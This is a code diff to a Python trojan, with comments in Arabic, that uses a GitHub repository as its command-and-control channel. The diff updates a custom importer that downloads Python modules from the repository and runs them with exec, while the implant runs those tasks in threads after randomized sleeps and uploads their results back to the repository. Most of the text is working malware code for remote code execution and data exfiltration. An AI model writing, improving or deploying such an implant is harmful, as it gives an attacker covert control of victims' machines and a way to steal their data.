@@ -1,6 +1,8 @@
 import base64
 import github3
 import importlib
+import importlib.abc
+import importlib.util
 import json
 import random
 import sys
@@ -9,6 +11,7 @@ import time
 from datetime import datetime
 
 def github_connect():
+    # قراءة التوكن من الملف المحلي
     with open('mytoken.txt') as f:
         token = f.read().strip()
     user = 'alakhas997-droid'
@@ -38,7 +41,8 @@ class Trojan:
         self.store_module_result(result)
 
     def store_module_result(self, data):
-        message = datetime.now().isoformat()
+        # تعديل صيغة الوقت لتكون مقبولة في أسماء ملفات ويندوز (بدون نقطتين راسيتين)
+        message = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         remote_path = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))
@@ -50,28 +54,29 @@ class Trojan:
                 thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                 thread.start()
                 time.sleep(random.randint(1, 10))
+            # فترة الانتظار بين كل دورة
             time.sleep(random.randint(30*60, 3*60*60))
 
-class GitImporter:
+class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
     def __init__(self):
         self.current_module_code = ""
-    def find_module(self, name, path=None):
-        print("[*] Attempting to retrieve %s" % name)
+
+    def find_spec(self, fullname, path, target=None):
+        print(f"[*] Attempting to retrieve {fullname}")
         self.repo = github_connect()
         try:
-            new_library = get_file_contents('modules', f'{name}.py', self.repo)
-        except:
+            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return importlib.util.spec_from_loader(fullname, loader=self)
+        except Exception as e:
             return None
-        if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library)
-            return self
+
+    def create_module(self, spec):
         return None
-    def load_module(self, name):
-        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
-        new_module = importlib.util.module_from_spec(spec)
-        exec(self.current_module_code, new_module.__dict__)
-        sys.modules[spec.name] = new_module
-        return new_module
+
+    def exec_module(self, module):
+        exec(self.current_module_code, module.__dict__)
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
